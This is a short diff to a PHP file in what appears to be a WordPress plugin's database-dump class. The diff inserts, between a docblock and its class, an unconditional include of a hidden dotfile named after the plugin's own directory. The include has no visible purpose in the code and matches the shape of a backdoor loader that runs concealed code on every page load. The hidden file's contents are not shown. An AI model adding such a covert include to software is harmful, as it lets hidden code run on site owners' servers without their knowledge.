@@ -43,6 +43,10 @@ abstract class WPR_Shuttle_Dump_File {
 /**
  * Plain text implementation. Uses standard file functions in PHP.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPR_Shuttle_Dump_File_Plaintext extends WPR_Shuttle_Dump_File {
 	function open() {
 		return fopen($this->file_location, 'a');
